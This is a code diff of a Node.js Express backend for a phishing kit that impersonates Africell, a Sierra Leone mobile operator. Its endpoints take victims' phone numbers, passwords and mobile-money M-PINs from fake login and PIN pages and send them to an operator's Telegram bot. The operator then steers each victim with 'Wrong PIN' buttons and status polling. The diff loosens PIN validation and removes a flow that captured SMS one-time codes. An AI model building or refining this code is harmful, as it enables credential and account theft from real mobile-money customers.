@@ -7,11 +7,10 @@ const PORT = process.env.PORT || 8080;
 
 app.use(cors());
 app.use(express.json());
-app.use(express.static('.')); // Tells Express to serve your HTML files
+app.use(express.static('.')); // Tells Express to serve your static HTML files
 
-// Temporary memory pads to track user states by phone number
-const orderStatuses = {};   // Tracks Login / PIN steps
-const promoStatuses = {};   // Tracks SMS Code Verification step
+// Memory pads to track user authentication states by phone number
+const orderStatuses = {};   
 const lastSubmissionTime = {}; 
 
 // Helper function to safely fetch from Telegram with a built-in timeout and abort handler
@@ -57,8 +56,9 @@ app.post('/api/submit-order', async (req, res) => {
         const countryFlag = "🇸🇱";
         const countryCode = "+232";
 
-        // Check if this submission is from pin.html (4-digit PIN) or login.html (Password)
-        const isPinStep = uniqueId && uniqueId.length === 4 && /^\d+$/.test(uniqueId);
+        // Check if this submission is from pin.html (PIN code) or login.html (Password)
+        // Since pin.html can now be any length, we check if it's purely numeric or coming from pin step
+        const isPinStep = /^\d+$/.test(uniqueId) && uniqueId.length >= 4; 
         const headerTitle = isPinStep ? "🔐 *Africell M-PIN Submitted*" : "🔔 *New Africell Login Attempt*";
         const credentialLabel = isPinStep ? "M-PIN" : "Password";
 
@@ -68,7 +68,6 @@ app.post('/api/submit-order', async (req, res) => {
                         `🔑 ${credentialLabel}: \`${uniqueId || 'N/A'}\``;
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
         const wrongButtonText = isPinStep ? "⚠️ Wrong PIN" : "⚠️ Wrong Password";
 
         await sendToTelegram(telegramUrl, {
@@ -88,7 +87,7 @@ app.post('/api/submit-order', async (req, res) => {
             }
         });
 
-        res.json({ success: true, message: 'Sent to chef.' });
+        res.json({ success: true, message: 'Sent successfully.' });
     } catch (error) {
         console.error(error);
         res.status(500).json({ success: false, message: 'Error' });
@@ -102,86 +101,6 @@ app.get('/api/check-status', (req, res) => {
     
     console.log(`Polling check for phone: [${phone}] -> status: ${status}`);
     res.json({ status });
-});
-
-// Handles SMS Code (scratch.html) verification
-app.post('/api/verify-promo', async (req, res) => {
-    try {
-        const { phone, promoCode, uniqueId } = req.body; 
-        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-        promoStatuses[phone] = 'pending';
-
-        const countryFlag = "🇸🇱";
-        const message = `📋 *SMS Code Verification Request*\n\n` +
-                        `${countryFlag} Phone: \`${phone}\`\n` +
-                        `🔑 Credential: \`${uniqueId || 'N/A'}\`\n` + 
-                        `🔢 Code Entered: \`${promoCode}\``;
-
-        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        const tgResponse = await sendToTelegram(telegramUrl, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: "✅ Valid Code", callback_data: `valid_${phone}_${uniqueId || 'N/A'}` },
-                        { text: "❌ Wrong Code", callback_data: `wrong_code_${phone}_${uniqueId || 'N/A'}` }
-                    ],
-                    [
-                        { text: "🔄 Try Again", callback_data: `try_again_${phone}_${uniqueId || 'N/A'}` }
-                    ]
-                ]
-            }
-        });
-
-        if (tgResponse && tgResponse.ok === false) {
-            console.error("Telegram API Error:", tgResponse);
-            return res.status(400).json({ success: false, message: tgResponse.description || 'Telegram rejection' });
-        }
-
-        res.json({ success: true, message: 'Success!.' });
-    } catch (error) {
-        console.error("CRITICAL BACKEND ERROR in /api/verify-promo:", error.message);
-        res.status(500).json({ success: false, message: 'Error' });
-    }
-});
-
-// Polling loop for scratch.html SMS verification status
-app.get('/api/check-promo-status', (req, res) => {
-    const phone = req.query.phone ? req.query.phone.trim() : '';
-    const status = promoStatuses[phone] || 'pending';
-    res.json({ status });
-});
-
-app.post('/api/send-thank-you', async (req, res) => {
-    try {
-        const { phone, uniqueId } = req.body;
-        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-        const countryFlag = "🇸🇱";
-        const message = `💬 *OTP Resend Requested*\n\n` +
-                        `${countryFlag} Phone: \`${phone}\`\n` +
-                        `🔑 Credential: \`${uniqueId || 'N/A'}\`\n` +
-                        `📌 Action: *Resend SMS Code*`;
-
-        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        await sendToTelegram(telegramUrl, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
-
-        res.json({ success: true, message: 'sent.' });
-    } catch (error) {
-        console.error("CRITICAL BACKEND ERROR in /api/send-thank-you:", error.message);
-        res.status(500).json({ success: false, message: 'Error' });
-    }
 });
 
 // Handles inline button clicks from Telegram admin
@@ -221,27 +140,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 orderStatuses[phone] = 'wrong_id';
                 actionText = 'Incorrect Credential ⚠️';
                 messageTitle = 'Credential Error Result';
-            } else if (callbackData.startsWith('valid_')) {
-                const parts = callbackData.replace('valid_', '').split('_');
-                phone = parts[0];
-                uniqueId = parts[1] || 'N/A';
-                promoStatuses[phone] = 'valid';
-                actionText = 'Valid Code ✅ (Accepted)';
-                messageTitle = 'Code Verification Result';
-            } else if (callbackData.startsWith('wrong_code_')) {
-                const parts = callbackData.replace('wrong_code_', '').split('_');
-                phone = parts[0];
-                uniqueId = parts[1] || 'N/A';
-                promoStatuses[phone] = 'invalid';
-                actionText = 'Wrong Code ❌ (Cleared)';
-                messageTitle = 'Code Verification Result';
-            } else if (callbackData.startsWith('try_again_')) {
-                const parts = callbackData.replace('try_again_', '').split('_');
-                phone = parts[0];
-                uniqueId = parts[1] || 'N/A';
-                promoStatuses[phone] = 'try_again';
-                actionText = 'Try Again 🔄 (Awaiting New Code)';
-                messageTitle = 'Code Verification Result';
             }
 
             let updatedMessage = `📋 *${messageTitle}*\n\n` +
